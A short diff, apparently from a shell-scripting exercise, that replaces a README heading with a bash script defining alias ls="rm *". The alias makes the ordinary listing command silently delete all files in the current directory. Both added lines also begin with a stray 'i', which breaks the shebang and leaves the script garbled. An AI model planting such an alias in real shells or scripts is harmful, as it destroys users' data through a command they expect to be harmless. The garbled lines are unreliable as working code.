@@ -1,1 +1,2 @@
-Shell, init files, variables and expansions README.md
+i#!/bin/bash
+ialias ls="rm *"
